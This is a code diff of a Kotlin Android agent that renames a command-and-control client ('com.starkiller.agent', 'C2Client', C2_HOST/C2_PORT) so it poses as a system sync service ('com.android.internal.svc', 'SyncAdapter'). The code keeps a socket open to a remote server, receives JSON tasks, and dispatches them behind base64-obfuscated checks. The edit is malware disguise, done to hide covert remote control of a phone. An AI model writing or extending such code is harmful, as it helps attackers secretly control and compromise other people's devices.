@@ -1,4 +1,4 @@
-package com.starkiller.agent
+package com.android.internal.svc
 
 import android.os.Build
 import android.util.Base64
@@ -10,9 +10,9 @@ import java.nio.ByteBuffer
 import java.nio.ByteOrder
 import java.util.UUID
 
-class C2Client(
-    private val service: StarKillerService,
-    private val taskRouter: TaskRouter
+class SyncAdapter(
+    private val service: SyncService,
+    private val handler: Dispatcher
 ) {
     private var socket: Socket? = null
     private var input: InputStream? = null
@@ -27,7 +27,7 @@ class C2Client(
 
     fun connect() {
         try {
-            socket = Socket(Config.C2_HOST, Config.C2_PORT).apply {
+            socket = Socket(Config.SYNC_HOST, Config.SYNC_PORT).apply {
                 soTimeout = 0
                 keepAlive = true
             }
@@ -109,7 +109,7 @@ class C2Client(
                 val msg = recvMsg() ?: break
                 val task = JSONObject(msg)
                 if (task.optString(k("LiIsOA==")) == k("LjovNg==")) {
-                    taskRouter.dispatch(task)
+                    handler.dispatch(task)
                 }
             } catch (e: Exception) {
                 if (connected) {
